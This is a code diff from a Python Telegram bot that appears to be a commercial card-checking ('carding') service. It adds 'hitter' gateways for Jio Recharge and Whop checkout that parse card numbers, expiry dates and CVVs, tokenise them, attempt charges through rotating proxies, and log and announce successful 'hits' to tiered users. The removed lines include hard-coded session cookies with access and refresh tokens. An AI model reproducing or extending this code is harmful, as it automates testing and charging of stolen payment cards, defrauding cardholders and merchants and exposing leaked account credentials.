-            f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ Jio Recharge\n"
-            f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {message_text[:80]}\n"
-            f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
-            f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
-            f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
-            f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
-        )
-        
-        # Add transaction ID if available
-        if result.get("transaction_id") and result["transaction_id"] != "N/A":
-            output += f"\n[⌬] 𝐓𝐱𝐧 𝐈𝐃 ↣ <code>{result['transaction_id']}</code>"
-        
-        await status_msg.edit_text(output, parse_mode=ParseMode.HTML)
+    cc, mm, yy, cvv = [p.strip() for p in parts]
+    card_display = f"{cc}|{mm}|{yy}|{cvv}"
 
-        # Save hit if charged
-        if status_category == "charged":
+    proxy = None
+    try:
+        proxy = get_stripe_user_proxy(user_id)
+        if not proxy:
+            proxies = load_stripe_proxies()
+            all_proxies = []
+            for user_proxies in proxies.values():
+                if isinstance(user_proxies, list):
+                    all_proxies.extend(user_proxies)
+                else:
+                    all_proxies.append(user_proxies)
+            if all_proxies:
+                proxy = random.choice(all_proxies)
+    except:
+        pass
+
+    proxy_str = None
+    if proxy:
+        proxy_str = proxy
+
+    processing_msg = await message.reply_text(
+        f"🚀 <b>Processing Jio Recharge...</b>\n\n"
+        f"📱 <b>Phone:</b> <code>{phone}</code>\n"
+        f"💰 <b>Amount:</b> ₹{amount}\n"
+        f"💳 <b>Card:</b> <code>{cc[:4]}****{cc[-4:]}</code>\n"
+        f"🌐 <b>Proxy:</b> {mask_proxy(proxy) if proxy else 'None'}\n\n"
+        f"⏳ Please wait...",
+        parse_mode=ParseMode.HTML
+    )
+
+    try:
+        result = jio_hit(phone, amount, cc, mm, yy, cvv, proxy_str)
+
+        status = result.get("status", "UNKNOWN")
+        message_text = result.get("message", "")
+        elapsed = result.get("elapsed", 0)
+        card_full = result.get("card", card_display)
+
+        if "insufficient" in message_text.lower():
+            result["status"] = "INSUFFICIENT_FUNDS"
+            result["message"] = "Insufficient funds"
+
+        ui, status_category = format_jio_response(result, card_full)
+
+        await processing_msg.edit_text(ui, parse_mode=ParseMode.HTML)
+
+        # ============ SEND HIT NOTIFICATION ============
+        if status_category in ["charged", "approved"]:
+            tier = user_manager.get_tier(user_id)
+            user_data = user_manager.get_user(user_id)
+            bin_info = await get_bin_info(card_full)
+            
             await save_hit_to_file(
-                card=card,
+                card=card_full,
                 gateway="Jio Recharge",
-                response=message_text,
+                response=result.get("message", status),
                 price=f"₹{amount}",
                 bin_info=bin_info,
                 user_id=user_id,
-                user_tier=user_manager.get_tier(user_id)
+                user_tier=tier
             )
             
-            user_data = user_manager.get_user(user_id)
             await send_hit_notification(
                 context=context,
                 gateway="Jio Recharge",
-                card=card,
-                response=message_text,
+                card=card_full,
+                response=result.get("message", status),
                 price=f"₹{amount}",
                 user=user_data,
                 bin_info=bin_info,
-                status_category="charged"
+                status_category=status_category
             )
+            
             user_manager.increment_hits(user_id)
 
         user_manager.increment_checks(user_id)
 
     except Exception as e:
-        try:
-            if status_msg:
-                await status_msg.edit_text(f"❌ Error: {str(e)[:100]}", parse_mode=ParseMode.HTML)
-            else:
-                await message.reply_text(f"❌ Error: {str(e)[:100]}", parse_mode=ParseMode.HTML)
-        except:
-            pass
-        print(f"❌ [JIO] Error: {traceback.format_exc()}")
-        add_user_credits(user_id, 1)
-    finally:
-        jio_hitter_active_tasks.pop(user_id, None)
+        error_msg = str(e)
+        await processing_msg.edit_text(
+            f"❌ <b>Error</b>\n\n"
+            f"{error_msg}\n\n"
+            f"Please try again later.",
+            parse_mode=ParseMode.HTML
+        )
+        print(f"Jio hit error: {e}")
+        import traceback
+        traceback.print_exc()
 
 
-
-# ============ ADD TO MAIN() ============
+# ============ ADD TO MAIN ============
+# Add this to your main() function:
 # app.add_handler(CommandHandler("jhit", jhit_command))
 
 
@@ -19852,9 +20047,7 @@ class UserManager:
             "max_batch_size": 3000,
             "can_use_proxy": True,
             "can_access_gateways": [
-                "shopify", "auto_stripe", "adyen_direct", "paypal", 
-                "b3charged", "razorpay", "stripe_charge", "stripe_auth", 
-                "braintree", "autosopi", "payflow"
+
             ],
             "can_add_autosopi_sites": True,
             "can_mass_check": True,
@@ -19874,7 +20067,9 @@ class UserManager:
             "can_access_gateways": [
                 "shopify", "auto_stripe", "adyen_direct", "paypal", "stripe_charge_v2","adyen","stripe_pl","stripe_auth0",
                 "b3charged", "razorpay", "stripe_charge", "stripe_auth","paypal_donation", "stripe_chk", "st1_gateway" ,
-                "dork", "braintree", "autosopi", "payflow" "stripe_1usd", "payglocal",
+                "dork", "braintree", "autosopi", "payflow" "stripe_1usd", "payglocal", "stco",    # Stripe Checkout Hitter
+                "jhit",    # Jio Recharge Hitter
+                "whop" 
             ],
             "can_add_autosopi_sites": True,
             "can_mass_check": True,
@@ -19894,7 +20089,9 @@ class UserManager:
             "can_access_gateways": [
                 "paypal", "shopify", "adyen_direct", "auto_stripe","stripe_charge_v2", "adyen","stripe_pl","stripe_auth0",
                 "b3charged", "razorpay", "stripe_charge", "stripe_auth", "paypal_donation",
-                "braintree", "autosopi", "payflow", "stripe_chk","st1_gateway" , "stripe_1usd", "payglocal",
+                "braintree", "autosopi", "payflow", "stripe_chk","st1_gateway" , "stripe_1usd", "payglocal", "stco",    # Stripe Checkout Hitter
+                "jhit",    # Jio Recharge Hitter
+                "whop" 
             ],
             "can_add_autosopi_sites": True,
             "can_mass_check": True,
@@ -21050,6 +21247,13 @@ async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         info_msg += f"\n\n⚠️ <i>Free tier: Single checks only. Upgrade for mass checks!</i>"
     
     await update.message.reply_text(info_msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())
+
+
+
+
+
+
+
 
 
 # ============ STRIPE CHECKOUT HITTER - WITH DETAILED DEBUGGING ============
@@ -57636,1075 +57840,1018 @@ async def test_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.edit_message_text(result, parse_mode=ParseMode.HTML, reply_markup=back_menu())
 
 
-# ============ WHOP CHECKOUT HITTER - WITH CLIENT_SECRET IN FETCH ============
 
-import time
+# ============ WHOP GATEWAY - WITH PREMIUM EMOJIS (LIKE SHOPIFY) ============
+# Add this to your f13.py
+
 import re
 import json
-import uuid
+import time
 import random
-import string
 import asyncio
-import os
-from typing import Dict, Optional, List, Tuple
+from typing import Dict, Optional
+from urllib.parse import urlparse, parse_qs
 import httpx
 from faker import Faker
-from urllib.parse import urlparse, parse_qs
-from datetime import datetime, timezone
+import uuid
+from datetime import datetime
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.constants import ParseMode
 
-# ============ CONFIGURATION ============
-WHOP_API_URL = "https://whop.com/api/v1"
-WHOP_BASIS_KEY = "key_prod_us_pub_Ew4Bw1f81FPoqphvpuX1VR"
+# ============ WHOP HITTER CONFIG ============
+WHOP_API = "https://whop.com/api/v1"
+BASIS_KEY = "key_prod_us_pub_Ew4Bw1f81FPoqphvpuX1VR"
+WHOP_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+           "AppleWebKit/537.36 (KHTML, like Gecko) "
+           "Chrome/151.0.0.0 Safari/537.36")
 
-# ============ SESSION COOKIE CACHE ============
-session_cookie_cache = {}
+# Active tasks for Whop Hitter
+whop_active_tasks = {}
 
-# ============ BUILD COOKIE ============
-
-def build_whop_cookie_string(session_id: str = None) -> str:
-    """Build complete cookie string for Whop."""
+# ============ PREMIUM EMOJI IDs - UPDATE THESE WITH CORRECT IDs ============
+# Get correct IDs from @AdsMarkdownBot
+PREMIUM_EMOJI_IDS = {
+    # Status emojis
+    "charged": "5039670412733055750",      # 🔥 Fire - UPDATE THIS
+    "approved": "6266787022111773140",     # ✅ Checkmark - UPDATE THIS
+    "declined": "6267039884016358504",     # ❌ Cross mark - UPDATE THIS
+    "warning": "6267237615720731788",      # ⚠️ Warning - UPDATE THIS
+    "success": "5041796412954641308",      # 💎 Diamond - UPDATE THIS
     
-    cookie_map = {
-        'whop_sig_id': '27373658-2b0b-429f-9bb0-b187c4b7c105',
-        'whop-frosted-theme': 'appearance:light',
-        '_twpid': 'tw.1782207758985.80863837335348737',
-        '_ga': 'GA1.1.266938330.1782207759',
-        'ajs_anonymous_id': 'c7b4c3db-1153-416d-943f-c9743341be4e',
-        '__stripe_mid': '008396a3-6564-48f9-adcd-353b84e74323cae15d',
-        'whop-core.refresh-token': '36babd2deea7351588e3450a8c1efa6e3f59a18d71997283836163fa77dc2729',
-        'ajs_user_id': 'user_SoNLkQUsrw3tY',
-        '_adora_user_id': '019ef3dc-795c-7148-ac2b-eb1a4fa01dda',
-        'whop-core.user-id': 'user_SoNLkQUsrw3tY',
-        'whop-theme-resolved': 'light',
-        '_scid': 'iukPipBOJCfX2Jc9RVa5KqH-yxK4jLMv',
-        '_tt_enable_cookie': '1',
-        '_ttp': '01M0DG0M9YXWY9NB9E5DPE9CSQ_.tt.1',
-        '_fbp': 'fb.1.1787159400845.349116277732861774',
-        '_sctr': '1%7C1787077800000',
-        'hubspotutk': 'e3fc82d8ff03683d1370744e6e497a80',
-        'NEXT_LOCALE': 'en',
-        'web-personal-view-welcome-dismissed': '1',
-        '_wuid': 'wuid_24336q1p2j6b4q0s3l0f',
-        '_wuid_link': 'wuid_24336q1p2j6b4q0s3l0f',
-        'whop-global-header-last-balance-user_SoNLkQUsrw3tY': '0',
-        '_gcl_au': '1.1.116045759.1782207759.2011548182.1787252317.1787253209.109242530.1787252317.1787253209',
-        'cf_clearance': 'eVA4B4FvcNt6tT.4g6O49rCskJQxFaka_pUDRVG2UBc-1787288510-1.2.1.1-PPIc8u4SvqEeNQpTN990buKUjt27Z4vr2wyi1et3Fi9JFVEmvLqOvesthG6F.TbxJx7wB9GweDFakUWXLUNQdikEoSRS..s5ZqMj0XN0_PwmsUIoSwV4p595W0GCpKKWjdAPubTYCeJGDgCQ6SiOsF2wXCgcC3fQiaLu9zRDLM_Dt1a1PjwckfQuc7wzg7zzTtaXJ8_EmhIVjFFQNaHM7qeHnnp_9u0YTT1PwCIE4STkHvXE.xPmnCVxAx2l8k8uyuZcQZ.ncuhVI8sR_NjgiVk4ISu0CjqsE724nfflTRBdO.CRu1yP64z1zLEZ_86DSh2VhH17fmGPT5b2UOj8ayS7Kne0PL3_kMh0mk46mKA',
-        '_ga_NGD3HKQGSV': 'GS2.1.s1787288648$o7$g1$t1787288651$j57$l0$h0',
-        '_scid_r': 'lWkPipBOJCfX2Jc9RVa5KqH-yxK4jLMvAE7Geg',
-        '__hstc': '37712383.e3fc82d8ff03683d1370744e6e497a80.1787159407440.1787252918761.1787288655064.7',
-        '__hssrc': '1',
-        '__hssc': '37712383.1.1787288655064',
-        '__cf_bm': 'pEtCgTK0Ix_aWIEmpcxbidOrTiKxpkeTvxc3my9FGcw-1787290157.903622-1.0.1.1-tWaiNQ.UZDejhd0lBetG2QCSFyzR6lv8j_zyaAfSBQF_NJ.SH3xCWiM_hzVomXQPlyvie90zUhs2SwVXu.QU.FYbzNTxBmTXn5p7jdwunfEWRnCB.lw4vMpJKnJYimCp',
-        'ttcsid': '1787288659717::BIOFmbjQYRrhUYyCacWL.6.1787290372057.0::1.-11887.0::1712332.19.878.586::1708307.24.0',
-        'ttcsid_D93DANRC77UB3EFMUUR0': '1787288659716::GnwpVquUZvhWqaJgD3g4.6.1787290372057.1',
-        'whop-core.access-token': 'eyJraWQiOiJkZWZhdWx0LWtleS1pZC1lczI1Ni1wcm9kIiwiYWxnIjoiRVMyNTYifQ.eyJleHAiOjE3ODcyOTM4NTYsInN1YiI6InVzZXJfU29OTGtRVXNydzN0WSIsImlhdCI6MTc4NzI5MDI1NiwiaXNzIjoid2hvcC1yYWlscy1wcm9kIiwidHlwIjoiYWNjZXNzIiwidiI6MSwicm9sZXMiOltdLCJlbWFpbCI6Im5pc2kzMTAyOUBnbWFpbC5jb20iLCJjcmVhdGVkX2F0IjoxNzgyMjA3NjU2LCJzaWQiOiJlNTkzYTk2Ni1jNmQ2LTQzYzYtYTc2Zi01MTJhMzdlOGVmYjUifQ.e8EPkYX-548wbWdVvV4_1IDJ5KLvvimeCu7UyKLw_Iu4vzWLlPeZ_2UaPGaGfh7iXTm2H_uG-Neq1tkmaNlk5Q',
-        'whop-core.uid-token': 'eyJraWQiOiJkZWZhdWx0LWtleS1pZC1lczI1Ni1wcm9kIiwiYWxnIjoiRVMyNTYifQ.eyJleHAiOjE3ODcyOTM4NTYsInN1YiI6InVzZXJfU29OTGtRVXNydzN0WSIsImlhdCI6MTc4NzI5MDI1NiwiaXNzIjoid2hvcC1yYWlscy1wcm9kIiwidHlwIjoidWlkIn0.o0678UB5sTLt3fh8Lp3Di2ZPcPTNGjwl2MMM1r8WhdTeMgvirD5f49eefuzIJX_cpki76zKNrriKrhJJiQ6r8A',
-        'whop-right-sidebar': 'messages:400',
-        '__Host-affiliate_code': 'resurrected',
-    }
+    # Card/BIN related
+    "card": "5472250091332993630",         # 💳 Credit card - UPDATE THIS
+    "bank": "5332455502917949981",         # 🏦 Bank - UPDATE THIS
+    "money": "5201873447554145566",        # 💵 Money - UPDATE THIS
     
-    if session_id:
-        checkout_key = f"whop_checkout_key_{session_id}"
-        cookie_map[checkout_key] = f"{session_id}"
+    # Gateway emojis
+    "paypal": "5039670412733055750",       # 🔥 - UPDATE THIS
+    "shopify": "5041796412954641308",      # 💎 - UPDATE THIS
     
-    cookie_string = '; '.join([f"{k}={v}" for k, v in cookie_map.items()])
-    return cookie_string
+    # UI elements
+    "time": "5382194935057372936",         # ⏱️ - UPDATE THIS
+    "stats": "5028746137645876535",        # 📊 - UPDATE THIS
+    "users": "5784914081165087232",        # 👥 - UPDATE THIS
+    
+    # Misc
+    "lock": "5197288647275071607",         # 🔐 - UPDATE THIS
+    "globe": "5447410659077661506",        # 🌐 - UPDATE THIS
+    "star": "6282793227057632654",         # ⭐ - UPDATE THIS
+    "skull": "5042167377869932162",        # 💀 - UPDATE THIS
+    "target": "5377336227533969892",       # 🎯 - UPDATE THIS
+    "toy": "5249244862359812334",          # 📌 - UPDATE THIS
+    "diamond": "5427168083074628963",      # 💎 - UPDATE THIS
+    "flower": "6230927657257668107",       # 🌸 - UPDATE THIS
+    "pink": "5041796412954641308",         # 💖 - UPDATE THIS
+    "doller": "5197434882321567830",       # 💵 - UPDATE THIS
+    "fire": "5471133374264684999",         # 🔥 - UPDATE THIS
+    "clock": "5262540380301191210",        # ⏱️ - UPDATE THIS
+    "id": "5307905813451397794",           # 🆔 - UPDATE THIS
+    "receipt": "5226929552319594190",      # 🧾 - UPDATE THIS
+    "info": "5042306247047513767",         # ℹ️ - UPDATE THIS
+    "error": "6282641460093260838",        # 🔴 - UPDATE THIS
+}
 
-# ============ HELPERS ============
+def premium_emoji(emoji_id: str, fallback: str = "•") -> str:
+    """Generate premium emoji HTML tag"""
+    return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
 
-def parse_card_whop(text: str) -> Optional[Dict]:
-    """Parse card from text input."""
-    text = text.strip()
-    parts = re.split(r'[|:/\\\-\s]+', text)
+# ============ WHOP HELPER FUNCTIONS ============
+
+def whop_extract_plan_id(url: str) -> Optional[str]:
+    m = re.search(r"/(plan_[A-Za-z0-9]+)", url)
+    return m.group(1) if m else None
+
+def whop_parse_card(text: str) -> Optional[Dict]:
+    parts = re.split(r"[|:/\\\-\s]+", text.strip())
     if len(parts) < 4:
         return None
-    cc = re.sub(r'\D', '', parts[0])
+    cc = re.sub(r"\D", "", parts[0])
     if not (15 <= len(cc) <= 19):
         return None
-    month = parts[1].strip()
-    if len(month) == 1:
-        month = f"0{month}"
+    month = parts[1].strip().zfill(2)
     if not (len(month) == 2 and month.isdigit() and 1 <= int(month) <= 12):
         return None
     year = parts[2].strip()
-    if len(year) == 4:
-        year = year[2:]
+    year = year[2:] if len(year) == 4 else year
     if len(year) != 2:
         return None
-    cvv = re.sub(r'\D', '', parts[3])
+    cvv = re.sub(r"\D", "", parts[3])
     if not (3 <= len(cvv) <= 4):
         return None
     return {"cc": cc, "month": month, "year": year, "cvv": cvv}
 
-def parse_cards_whop(text: str) -> List[Dict]:
-    """Parse multiple cards from text."""
-    cards = []
-    for line in text.strip().split('\n'):
-        line = line.strip()
-        if line:
-            card = parse_card_whop(line)
-            if card:
-                cards.append(card)
-    return cards
-
-def extract_whop_url(text: str) -> Optional[str]:
-    """Extract Whop checkout URL from text."""
-    patterns = [
-        r'https?://whop\.com/checkout/[^\s\"\'\<\>\)]+',
-        r'https?://whop\.com/[^\s\"\'\<\>\)]+',
-    ]
-    for p in patterns:
-        m = re.search(p, text, re.IGNORECASE)
-        if m:
-            url = m.group(0).rstrip('.,;:')
-            return url
-    return None
-
-def extract_session_id_from_url(url: str) -> Optional[str]:
-    """Extract session ID from Whop URL."""
-    parsed = urlparse(url)
-    params = parse_qs(parsed.query)
-    
-    if 'session' in params:
-        return params['session'][0]
-    
-    match = re.search(r'/checkout/([^/?]+)', url)
-    if match:
-        return match.group(1)
-    
-    return None
-
-def get_currency_symbol(currency: str) -> str:
-    symbols = {
-        "USD": "$", "EUR": "€", "GBP": "£", "INR": "₹", "JPY": "¥",
-        "CNY": "¥", "KRW": "₩", "RUB": "₽", "BRL": "R$", "CAD": "C$",
-        "AUD": "A$", "MXN": "MX$", "SGD": "S$", "HKD": "HK$", "THB": "฿",
-        "VND": "₫", "PHP": "₱", "IDR": "Rp", "MYR": "RM", "ZAR": "R",
-        "CHF": "CHF", "SEK": "kr", "NOK": "kr", "DKK": "kr", "PLN": "zł",
-        "TRY": "₺", "AED": "د.إ", "SAR": "﷼", "ILS": "₪", "TWD": "NT$"
-    }
-    return symbols.get(currency, "")
-
-def format_proxy(proxy: str) -> str:
+def whop_proxy_url(proxy: str) -> Optional[str]:
     if not proxy:
         return None
     proxy = proxy.strip()
-    if '://' in proxy:
+    if "://" in proxy:
         return proxy
-    parts = proxy.split(':')
+    parts = proxy.split(":")
     if len(parts) == 4:
-        user, password, host, port = parts
-        return f"http://{user}:{password}@{host}:{port}"
+        if parts[0].replace(".", "").isdigit() or "." in parts[0]:
+            host, port, user, pwd = parts
+        else:
+            user, pwd, host, port = parts
+        return f"http://{user}:{pwd}@{host}:{port}"
     if len(parts) == 2:
         return f"http://{proxy}"
     return None
 
-def mask_proxy(proxy: str) -> str:
-    if not proxy:
-        return "None"
-    try:
-        if '@' in proxy:
-            parts = proxy.split('@')
-            return f"***@{parts[1]}"
-        return "***.***.***.***:***"
-    except:
-        return "Proxy (masked)"
+def whop_client(proxy: str = None, timeout: float = 60.0) -> httpx.AsyncClient:
+    kw = {"timeout": timeout, "verify": False, "follow_redirects": True}
+    p = whop_proxy_url(proxy)
+    if p:
+        kw["proxy"] = p
+    return httpx.AsyncClient(**kw)
 
-def get_stripe_user_proxy(user_id: int) -> str:
-    proxies = load_stripe_proxies()
-    user_proxies = proxies.get(str(user_id), [])
-    if user_proxies:
-        return random.choice(user_proxies) if isinstance(user_proxies, list) else user_proxies
-    return None
-
-def load_stripe_proxies() -> dict:
-    if os.path.exists("stripe_hitter_proxies.json"):
-        try:
-            with open("stripe_hitter_proxies.json", 'r') as f:
-                return json.load(f)
-        except:
-            return {}
-    return {}
-
-# ============ FETCH WHOP SESSION WITH CLIENT_SECRET ============
-
-async def fetch_whop_session(session_id: str, client_secret: str, cookie: str, proxy: str = None, retry_count: int = 0) -> Dict:
-    """Fetch Whop session details with client_secret to get payment info."""
-    print(f"📡 [Whop] Fetching session: {session_id} (attempt {retry_count + 1})")
-    
-    result = {
-        "session_id": session_id,
-        "client_secret": client_secret,
-        "status": None,
-        "merchant": None,
-        "product": None,
-        "amount": None,
-        "currency": None,
-        "payment_status": None,
-        "payment_id": None,
-        "last_confirm_error": None,
-        "error": None,
-        "exists": False
+def whop_build_cookie(session_id: str, client_secret: str, sig_id: str = "") -> str:
+    jar = {
+        "whop_sig_id": sig_id or str(uuid.uuid4()),
+        "whop-frosted-theme": "appearance:light",
+        "NEXT_LOCALE": "en",
+        "whop-theme-resolved": "light",
+        "whop_full_site": "1",
+        f"whop_checkout_key_{session_id}": client_secret,
     }
-    
+    return "; ".join(f"{k}={v}" for k, v in jar.items())
+
+# ============ WHOP API FUNCTIONS ============
+
+async def whop_create_session(plan_id: str, checkout_url: str, proxy: str = None) -> Optional[Dict]:
     try:
-        # CRITICAL FIX: Pass client_secret as query parameter
-        url = f"{WHOP_API_URL}/checkout_sessions/{session_id}?client_secret={client_secret}"
-        
+        async with whop_client(proxy) as c:
+            try:
+                r0 = await c.get("https://whop.com/", headers={"user-agent": WHOP_UA, "accept": "text/html"})
+                sig_id = c.cookies.get("whop_sig_id", "")
+            except Exception:
+                sig_id = str(uuid.uuid4())
+
+            headers = {
+                "accept": "*/*",
+                "content-type": "application/json",
+                "api-version-date": "2026-08-21",
+                "whop-private-schema": "true",
+                "user-agent": WHOP_UA,
+                "origin": "https://whop.com",
+                "referer": checkout_url,
+            }
+            r = await c.post(f"{WHOP_API}/checkout_sessions",
+                             headers=headers, json={"link": plan_id})
+
+        if r.status_code not in (200, 201):
+            print(f"❌ whop_create_session: HTTP {r.status_code} — {r.text[:200]}")
+            return None
+
+        d = r.json()
+        d["_sig_id"] = sig_id
+        print(f"✅ Whop session created: {d['id']}  client_secret: {d['client_secret'][:40]}…")
+        return d
+    except Exception as e:
+        print(f"❌ whop_create_session error: {e}")
+        return None
+
+async def whop_tokenise_card(card: Dict, proxy: str = None) -> Optional[str]:
+    try:
+        headers = {
+            "accept": "application/json",
+            "bt-api-key": BASIS_KEY,
+            "bt-region": "us-east-2",
+            "content-type": "application/json",
+            "origin": "https://js.basistheory.com",
+            "referer": "https://js.basistheory.com/",
+            "user-agent": WHOP_UA,
+        }
+        payload = {
+            "type": "card",
+            "data": {
+                "number": card["cc"],
+                "expiration_month": card["month"],
+                "expiration_year": f"20{card['year']}",
+                "cvv": card["cvv"],
+            },
+        }
+        async with whop_client(proxy) as c:
+            r = await c.post("https://api.basistheory.com/tokenize",
+                             headers=headers, json=payload)
+        if r.status_code in (200, 201):
+            tok = r.json().get("id")
+            if tok:
+                print(f"✅ Card tokenised: {tok}")
+                return tok
+        print(f"❌ Tokenise failed: {r.status_code} {r.text[:150]}")
+        return None
+    except Exception as e:
+        print(f"❌ Tokenise error: {e}")
+        return None
+
+async def whop_create_confirmation_token(session_id: str, card_token: str,
+                                          billing: Dict, cookie: str,
+                                          account_id: str,
+                                          proxy: str = None) -> Optional[str]:
+    try:
         headers = {
             "accept": "*/*",
-            "accept-language": "en-US,en;q=0.9",
             "api-version-date": "2026-08-21",
-            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36",
+            "content-type": "application/json",
+            "origin": "https://whop.com",
+            "referer": f"https://whop.com/checkout/{session_id}/",
+            "user-agent": WHOP_UA,
             "whop-private-schema": "true",
             "cookie": cookie,
-            "x-fern-language": "JavaScript",
-            "x-fern-runtime": "browser",
-            "x-fern-runtime-version": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36",
         }
-        
-        client_kwargs = {
-            'timeout': 30.0, 
-            'verify': False,
-            'follow_redirects': True,
+        payload = {
+            "account_id": account_id,
+            "billing_details": {
+                "email": billing["email"],
+                "name": billing["name"],
+                "address": {
+                    "line1": billing["line1"],
+                    "city": billing["city"],
+                    "state": billing["state"],
+                    "postal_code": billing["postal_code"],
+                    "country": "US",
+                },
+            },
+            "payment_method": {
+                "type": "card",
+                "category": "card",
+                "card": {"token": card_token},
+            },
+            "return_url": f"https://whop.com/checkout/{session_id}/",
+            "setup_future_usage": "off_session",
+            "attestations": {"tos_accepted": True},
         }
-        
-        if proxy:
-            proxy_url = format_proxy(proxy)
-            if proxy_url:
-                client_kwargs['proxy'] = proxy_url
-        
-        async with httpx.AsyncClient(**client_kwargs) as client:
-            response = await client.get(url, headers=headers)
-            
-            if response.status_code == 200:
-                data = response.json()
-                result["exists"] = True
-                result["status"] = data.get("status")
-                
-                seller = data.get("seller", {})
-                result["merchant"] = seller.get("title", "Unknown")
-                
-                items = data.get("items", [])
-                if items:
-                    result["product"] = items[0].get("name", "Unknown")
-                
-                quote = data.get("quote", {})
-                result["amount"] = quote.get("base_amount", 0)
-                result["currency"] = quote.get("base_currency", "USD").upper()
-                
-                # Get payment info - now available with client_secret
-                payment = data.get("payment")
-                if payment and isinstance(payment, dict):
-                    result["payment_status"] = payment.get("status")
-                    result["payment_id"] = payment.get("id")
-                else:
-                    result["payment_status"] = None
-                    result["payment_id"] = None
-                
-                # Get last error if any
-                last_error = data.get("last_confirm_error")
-                if last_error and isinstance(last_error, dict):
-                    result["last_confirm_error"] = last_error
-                
-                print(f"✅ [Whop] Session fetched: {result['status']}, Payment: {result.get('payment_status', 'None')}")
-                return result
-            else:
-                result["error"] = f"HTTP {response.status_code}"
-                print(f"❌ [Whop] Session fetch failed: {response.status_code}")
-                
-                if response.status_code >= 500 and retry_count < 3:
-                    await asyncio.sleep(2 ** retry_count)
-                    return await fetch_whop_session(session_id, client_secret, cookie, proxy, retry_count + 1)
-                
-                return result
-                
+        async with whop_client(proxy) as c:
+            r = await c.post(f"{WHOP_API}/confirmation_tokens",
+                             headers=headers, json=payload)
+        if r.status_code in (200, 201):
+            tok = r.json().get("id")
+            if tok:
+                print(f"✅ Confirmation token: {tok}")
+                return tok
+        print(f"❌ Confirmation token failed: {r.status_code} {r.text[:200]}")
+        return None
     except Exception as e:
-        result["error"] = str(e)[:100]
-        print(f"❌ [Whop] Session fetch error: {e}")
-        if retry_count < 3:
-            await asyncio.sleep(2 ** retry_count)
-            return await fetch_whop_session(session_id, client_secret, cookie, proxy, retry_count + 1)
-        return result
-
-# ============ POLL FOR PAYMENT STATUS ============
-
-async def poll_payment_status(
-    session_id: str,
-    client_secret: str,
-    cookie: str, 
-    proxy: str = None,
-    max_attempts: int = 20,
-    delay: int = 2
-) -> Dict:
-    """
-    Poll the session to check if payment has completed.
-    Uses client_secret to get full payment details.
-    """
-    print(f"🔄 [Whop] Polling payment status for {session_id}...")
-    
-    for attempt in range(max_attempts):
-        await asyncio.sleep(delay)
-        
-        result = await fetch_whop_session(session_id, client_secret, cookie, proxy)
-        
-        if result.get("error"):
-            print(f"⚠️ [Whop] Poll error: {result['error']}")
-            continue
-        
-        payment_status = result.get("payment_status")
-        session_status = result.get("status")
-        last_error = result.get("last_confirm_error")
-        
-        print(f"📊 [Whop] Poll {attempt + 1}/{max_attempts}: Session={session_status}, Payment={payment_status}")
-        
-        # Check if payment is complete
-        if payment_status == "succeeded":
-            result["final_status"] = "CHARGED"
-            result["final_message"] = "✅ Payment successful!"
-            return result
-        elif payment_status == "processing":
-            # Continue polling
-            if attempt >= max_attempts - 3:
-                result["final_status"] = "PROCESSING"
-                result["final_message"] = "⏳ Payment is still processing. Check back later."
-                return result
-        elif payment_status == "failed":
-            result["final_status"] = "FAILED"
-            result["final_message"] = "❌ Payment failed"
-            return result
-        
-        # Check for errors
-        if last_error and isinstance(last_error, dict):
-            error_code = last_error.get("code", "")
-            error_message = last_error.get("message", "")
-            
-            if "insufficient" in error_message.lower() or "funds" in error_message.lower():
-                result["final_status"] = "INSUFFICIENT_FUNDS"
-                result["final_message"] = f"Insufficient funds: {error_message}"
-                return result
-            elif "declined" in error_message.lower():
-                result["final_status"] = "DECLINED"
-                result["final_message"] = f"Card declined: {error_message}"
-                return result
-        
-        # Check session status
-        if session_status == "completed":
-            # The session is completed, check payment info
-            if payment_status == "succeeded" or payment_status is None:
-                result["final_status"] = "CHARGED"
-                result["final_message"] = "✅ Payment successful!"
-                return result
-        
-    # Max attempts reached
-    result["final_status"] = "TIMEOUT"
-    result["final_message"] = "⏰ Payment status check timed out"
-    return result
-
-# ============ BASIS THEORY TOKENIZATION ============
-
-async def get_basis_session(proxy: str = None) -> Dict:
-    """Get Basis Theory session for card tokenization."""
-    print(f"📡 [Whop] Getting Basis Theory session...")
-    
-    headers = {
-        "accept": "*/*",
-        "accept-language": "en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
-        "bt-api-key": WHOP_BASIS_KEY,
-        "content-type": "application/json",
-        "origin": "https://js.basistheory.com",
-        "referer": "https://js.basistheory.com/",
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-    }
-    
-    payload = {
-        "type": "card",
-        "data": {
-            "number": "",
-            "expiration_month": "",
-            "expiration_year": "",
-            "cvv": ""
-        }
-    }
-    
-    client_kwargs = {'timeout': 30.0, 'verify': False}
-    if proxy:
-        proxy_url = format_proxy(proxy)
-        if proxy_url:
-            client_kwargs['proxy'] = proxy_url
-    
-    async with httpx.AsyncClient(**client_kwargs) as client:
-        response = await client.post("https://js.basistheory.com/api/sessions", headers=headers, json=payload)
-        
-        if response.status_code in [200, 201]:
-            data = response.json()
-            print(f"✅ [Whop] Basis Theory session obtained")
-            return {
-                "session_key": data.get("session_key"),
-                "nonce": data.get("nonce"),
-                "expires_at": data.get("expires_at")
-            }
-        else:
-            print(f"❌ [Whop] Basis Theory session failed: {response.status_code}")
-            return None
-
-async def tokenize_card_basis(card: Dict, proxy: str = None) -> Optional[str]:
-    """Tokenize card using Basis Theory."""
-    print(f"📡 [Whop] Tokenizing card...")
-    
